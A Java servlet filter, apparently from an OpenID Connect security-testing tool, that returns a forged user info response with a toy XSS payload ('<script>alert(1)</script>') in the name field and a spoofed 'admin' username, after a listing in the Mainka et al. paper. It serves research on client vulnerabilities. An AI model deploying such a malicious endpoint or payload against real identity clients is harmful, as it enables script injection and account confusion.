package org.mitre.discovery.web;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.Writer;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Component;

/**
 * Writes a user info response with a toy XSS attack vector in the 'name' field (taken from Listing 3 of the Mainka et
 * al. paper).
 *
 * @author amar
 *
 */
@Component
public class CodeInjectionFilter implements Filter {

    private static final String PAYLOAD = "{\n"
            + "  \"sub\":\"01921.FLANRJQW\",\n"
            + "  \"name\":\"<script>alert(1)</script>\",\n"
            + "  \"preferred_username\":\"admin\",\n"
            + "  \"email\":\"bob@malicious.com\",\n"
            + "  \"email_verified\":true\n"
            + "}";

    @Override
    public void doFilter(final ServletRequest request, final ServletResponse response, final FilterChain chain)
            throws IOException, ServletException {

        final HttpServletResponse httpResponse = (HttpServletResponse) response;
        httpResponse.setHeader("Content-Type", "application/json;charset=UTF-8");

        final Writer writer = new BufferedWriter(new OutputStreamWriter(response.getOutputStream()));
        writer.write(PAYLOAD);
        writer.close();
    }
}